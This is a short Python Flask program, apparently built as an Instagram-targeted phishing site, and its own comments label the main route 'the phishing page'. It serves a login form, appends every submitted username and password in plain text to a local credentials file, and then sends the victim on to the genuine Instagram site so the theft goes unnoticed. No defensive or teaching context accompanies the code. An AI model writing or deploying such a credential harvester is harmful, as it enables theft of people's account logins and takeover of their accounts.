from flask import Flask, request, render_template, redirect, url_for

app = Flask(__name__)

# Route for the phishing page
@app.route('/')
def phishing_page():
    return render_template('login.html')

# Route to handle form submission
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']
    
    # Save credentials to a file
    with open('credentials.txt', 'a') as f:
        f.write(f'Username: {username}, Password: {password}\n')
    
    # Redirect to Instagram after saving credentials
    return redirect('https://www.instagram.com')

if __name__ == '__main__':
    app.run(debug=True)
